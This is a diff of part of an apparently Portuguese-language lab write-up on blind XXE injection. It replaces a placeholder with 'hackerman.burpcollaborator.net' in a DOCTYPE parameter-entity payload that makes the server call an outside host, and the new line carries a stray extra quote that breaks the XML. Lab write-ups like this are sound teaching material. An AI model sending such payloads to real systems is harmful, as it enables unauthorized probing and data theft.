@@ -360,7 +360,7 @@ Ficará da seguinte maneira:
 
 ```xml
 <!DOCTYPE stockCheck [
-<!ENTITY % roz SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %roz; ]>
+<!ENTITY % roz SYSTEM "http://hackerman.burpcollaborator.net""> %roz; ]>
 ```
 
 Sendo assim, tentaremos enviar através do `<productId>`:
